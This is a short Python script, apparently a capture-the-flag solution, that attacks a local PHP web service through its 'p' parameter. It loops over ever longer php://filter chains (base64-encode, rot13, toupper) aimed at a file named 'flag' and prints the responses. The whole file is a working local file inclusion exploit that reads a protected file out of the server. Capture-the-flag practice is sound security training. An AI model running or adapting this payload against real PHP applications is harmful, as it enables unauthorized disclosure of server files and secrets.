import requests

url = "http://0.0.0.0:9001"

filters = "convert.base64-encode|string.rot13|string.toupper|"
while True:
    final_payload = f"php://filter/{filters}/resource=flag"
    r = requests.get(url, params={
        "p": final_payload
    })
    text = r.text[385:]
    if text.startswith("FREE"):
        exit()
    print(text)
    filters += "convert.base64-encode|string.rot13|string.toupper|"

    